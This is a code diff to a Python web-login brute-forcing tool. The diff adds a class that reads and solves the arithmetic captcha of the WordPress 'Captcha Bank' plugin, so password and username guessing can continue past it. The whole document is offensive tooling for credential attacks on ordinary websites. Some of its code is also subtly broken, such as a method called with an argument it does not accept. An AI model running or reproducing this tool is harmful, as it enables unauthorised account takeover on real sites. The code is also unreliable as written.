@@ -87,21 +87,18 @@ class Bruter(object):
             post_tags = parser.tag_results
 
             #check if captch block was found
+            #and set up the values
             if parser.data_captcha_block:
-                captcha_val1 = int(parser.data_captcha_block[3])
-                captcha_val2 = int(parser.data_captcha_block[4].replace('=',''))
-                captcha_operator = parser.entityref_captcha_block
+                #create and fill the captcha handler
+                captcha_handler = CaptchaHandler()
+                captcha_handler.value1 = parser.data_captcha_block[3]
+                captcha_handler.value2 = parser.data_captcha_block[4].replace('=','')
+                captcha_handler.operator = parser.charref_captcha_block or parser.entityref_captcha_block 
 
-                #sometimes the operator is not properly encoded
-                #we need to check source code of the page
-                if captcha_operator == '' :
-                    if '&#43' in page:
-                        captcha_operator = 'plus'
-                    else:
-                        captcha_operator == 'divide'
+                #compute the captcha value
+                captcha_value = captcha_handler.compute_captcha_value()
 
-                captcha_value = parser.handle_captcha(captcha_val1,
-                        captcha_val2, captcha_operator)
+
             # add our username and password fields
             post_tags[self.username_field] = self.username
             post_tags[self.password_field] = brute
@@ -149,6 +146,18 @@ class Bruter(object):
             #from the html response
             post_tags = parser.tag_results
 
+            #check if captch block was found
+            #and set up the values
+            if parser.data_captcha_block:
+                #create and fill the captcha handler
+                captcha_handler = CaptchaHandler()
+                captcha_handler.value1 = parser.data_captcha_block[3]
+                captcha_handler.value2 = parser.data_captcha_block[4].replace('=','')
+                captcha_handler.operator = parser.entityref_captcha_block
+
+                #compute the captcha value
+                captcha_value = captcha_handler.compute_captcha_value(page)
+
             # add our username and password fields
             post_tags[self.username_field] = brute
             post_tags[self.password_field] = self.unprobable_password
@@ -186,7 +195,12 @@ class Bruter(object):
     
         return words
 
+
 class BruteParser(HTMLParser):
+    '''Class that will check the HTML code from the retrieved
+        and get the hidden parameter to repost.
+        It can also deal with some captcha.'''
+
     def __init__(self):
         HTMLParser.__init__(self)
         self.tag_results = {}
@@ -194,14 +208,14 @@ class BruteParser(HTMLParser):
         self.captcha_block = False
         self.data_captcha_block = []
         self.entityref_captcha_block = ''
-
-    #This method is automaticaly called during self.feed()
-    def handle_data(self, data):
-        if self.tag == "input":
-            print(data)
+        self.charref_captcha_block = ''
 
     def handle_starttag(self, tag, attrs):
-        #print(tag)
+        '''check for the star tags, to get the input values
+            and check if a captcha is present'''
+
+        #here, we store the input values in a dictionary
+        #to resubmit them
         if tag == "input":
             self.tag == "input"
             tag_name = None
@@ -215,10 +229,11 @@ class BruteParser(HTMLParser):
                 self.tag_results[tag_name] = value
 
         #check if this tag contains the captcha block
+        #starting point to spot some captcha
         if tag == 'p':
             for name, value in attrs:
                 #check whether we enter the captach block to 
-                #bruteforce it
+                #to analyse it
                 if name == 'class' and value == 'cptch_block':
                     self.captcha_block = True
 
@@ -230,6 +245,9 @@ class BruteParser(HTMLParser):
             self.captcha_block = False
 
     def handle_data(self, data):
+        '''capturing data. If we are in the captcha block, 
+            only the indeces 3 and 4 are of interest for the calculation
+            of the captcha value'''
 
         #if we are in captcha block we capture the data
         if self.captcha_block:
@@ -237,19 +255,60 @@ class BruteParser(HTMLParser):
             self.data_captcha_block.append(data)
 
     def handle_entityref(self, entity):
+        '''check some entityref. That is how the operator
+            for logical captcha is encoded'''
         if self.captcha_block:
             self.entityref_captcha_block = entity
 
-    def handle_captcha(self,val1, val2, op):
-        if op == 'minus':
-            return val1 - val2
+    def handle_charref(self, char):
+        '''check some entityref. That is how the operator
+            for logical captcha is encoded'''
+        if self.captcha_block:
+            self.charref_captcha_block = char
 
-        elif op == 'times':
-            return val1 * val2
+class CaptchaHandler:
+    ''' Class to handle the captcha from the Captcha Bank plugin
+        in Wordpress'''
 
-        elif op == 'plus':
-            return val1 + val2
+    def __init__(self):
+        self.value1 = 0
+        self.value2 = 0
+        self.operator = ''
+
+    def compute_captcha_value(self):
+        '''If the captcha is numerical calculation, 
+        this method makes the calculation from the output of 
+        the BruteHTMLParser'''
+
+        #check if the integers are integers
+        self.sanity_check_captcha_values()
+
+        #check the operator
+        self.sanity_check_captcha_operator()
+
+        if self.operator == 'minus':
+            return self.value1 - self.value2
+
+        elif self.operator == 'times':
+            return self.value1 * self.value2
+
+        elif self.operator == 'plus':
+            return self.value1 + self.value2
         
         else:
-            return val1 / val2
+            return self.value1 / self.value2
 
+
+    def sanity_check_captcha_values(self):
+        '''Sanity check for the input values'''
+        self.value1 = int(self.value1.replace('=',''))
+        self.value2 = int(self.value2.replace('=',''))
+ 
+    def sanity_check_captcha_operator(self):
+        '''Sometimes the operator is not cleary mentionned.
+            We have to find a way to determine it...'''
+
+        if self.operator == '43':
+            self.operator = 'plus'
+        elif self.operator == '8260':
+            self.operator = 'divide'
